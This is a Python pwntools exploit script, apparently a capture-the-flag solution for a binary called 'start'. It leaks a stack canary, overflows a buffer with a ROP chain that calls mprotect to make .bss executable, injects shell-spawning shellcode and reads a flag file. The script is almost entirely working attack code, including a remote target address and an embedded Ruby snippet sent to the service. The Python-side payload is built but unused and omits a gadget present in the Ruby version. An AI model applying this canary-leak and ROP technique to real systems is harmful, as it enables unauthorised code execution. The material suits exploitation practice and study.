from pwn import *
import sys, time

context.binary = "./start"
binary = ELF("./start")

if len(sys.argv) == 1:
    p = process(["./start"])
    log.info("PID : " + str(proc.pidof(p)[0]))
    pause()

else:
    p = remote("54.65.72.116", "31337")

int0x80 = 0x44fc63
pop1rdi = 0x4005d5
pop1rsi = 0x00000000004017f7
pop1rdx = 0x0000000000443776
mprotect = 0x440e60
read = 0x440300
bss = 0x6ce000

sc = asm(shellcraft.sh())

payload = p64(pop1rdi) + p64(bss) + p64(pop1rsi) + p64(0x1000) + p64(pop1rdx) + p64(7)
payload += p64(mprotect) + p64(pop1rdi) + p64(0) + p64(pop1rsi) + p64(bss) + p64(pop1rdx) + p64(0x100)
payload += p64(bss)

cmd = '''
    z = Sock.new '127.0.0.1', 31338
    context.arch = 'amd64'
    z.send 'BBBBBBBBAAAAAAAACCCCCCCCD'
    puts z.recvuntil('D')
    canary = u64(z.recv(7).rjust(8, "\x00"))
    int0x80 = 0x44fc63
    pop1rdi = 0x4005d5
    pop1rsi = 0x00000000004017f7
    pop1rdx = 0x0000000000443776
    mprotect = 0x440e60
    read = 0x440300
    bss = 0x6ce000
    sc = asm(shellcraft.sh)
    payload = p64(pop1rdi) + p64(bss) + p64(pop1rsi) + p64(0x1000) + p64(pop1rdx) + p64(7)
    payload += p64(mprotect) + p64(pop1rdi) + p64(0) + p64(pop1rsi) + p64(bss) + p64(pop1rdx) + p64(0x100)
    payload += p64(read) + p64(bss)
    exp = 'BBBBBBBBAAAAAAAACCCCCCCC' + p64(canary) + 'DDDDDDDD' + payload
    z.puts exp
    sleep 0.2
    z.puts 'exit'
    sleep 0.2
    z.puts sc
    sleep 0.2
    z.puts 'cat /home/start/flag'
    sleep 0.2
    puts z.recv
    puts z.recv
    puts z.recv
    puts z.recv
    puts z.recv
    '''

p.sendline(cmd)
time.sleep(0.1)

p.interactive()
